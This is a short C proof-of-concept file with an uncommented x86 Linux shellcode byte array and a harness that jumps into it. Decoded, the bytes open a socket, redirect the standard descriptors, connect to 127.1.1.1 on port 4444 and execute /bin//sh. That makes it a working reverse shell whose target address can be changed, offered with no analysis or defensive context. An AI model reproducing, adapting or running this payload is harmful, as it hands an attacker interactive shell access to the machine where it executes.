/* Shellcode PoC */

#include<stdio.h>
#include<string.h>



unsigned char code[]=\
"\x31\xdb\x31\xc0\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x53\x89\xe2\xb0\x0b\xcd\x80";

main()
{


printf("Length of shellcode is %d\n",strlen(code));

int (*ret)()=(int(*)())code;

ret();

}